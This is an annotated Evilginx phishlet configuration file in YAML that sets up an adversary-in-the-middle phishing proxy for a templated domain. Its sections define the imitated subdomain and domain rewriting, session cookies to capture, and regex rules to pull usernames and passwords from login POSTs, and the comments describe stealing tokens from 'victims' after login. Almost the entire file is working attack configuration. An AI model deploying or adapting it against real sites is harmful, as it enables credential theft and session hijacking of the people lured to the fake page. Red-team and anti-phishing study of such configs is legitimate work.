# Indicates the domain and subdomains to proxy.
# The phish_sub is the subdomain that the phishing page will imitate.
proxy_hosts:
  - { phish_sub: 'www', orig_sub: 'www', domain: '{domain}', session: true, is_landing: true }

# Allows the phishlet to replace instances of the actual domain name with the phishing domain, which is critical for the phishing page to function correctly.
sub_filters: 
  - { hostname: '{hostname}', sub: 'www', domain: '{domain}', search: '{domain}', replace: '{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'application/xml', 'image/*', 'font/*']} 
  - { hostname: '{hostname}', sub: 'www', domain: '{domain}', search: '{domain}', replace: '{hostname}', mimes: ['application/x-www-form-urlencoded']}

# Identifies the cookies that should be captured from the victim's browser to gain access to the victim's session.
auth_tokens:
  - domain: '{domain}'
    keys: ['session']

# This field determines the credentials that the phishlet is engineered to steal.
# The key is the name of the credential and search is a regex that the program will use to identify and extract these details from the user's input.
creds:
  - key: 'username'
    search: ['(.*)']
    type: 'post'
  - key: 'password'
    search: ['(.*)']
    type: 'post'

# Defines the URLs that Evilginx will treat as the authenticated URLs.
# After the victim logs in, Evilginx will look out for a redirect to one of these URLs, at which point it will steal the listed auth_tokens.
auth_urls:
  - url_regex: 'https://{hostname}/login'
    valid_statuses: [200]

# Here you specify the identifiers of the username and password fields in the login form on the original webpage.
# The url is the link of the page where the victim enters their credentials.
login:
  username: user
  password: pass
  url: https://www.{domain}/login

# force_post: If set to true, it forces the alteration of HTTP method from GET to POST.
# is_landing: If set to true, it means that the page is a landing page for the phishing attack.
# js_inject: This is where you can write some JavaScript to be injected in the webpage. It's typically used to enhance the phishing attack and ensure a smoother victim experience.
# domain: This is a template variable used to replace target hostname used in phishlet configuration.
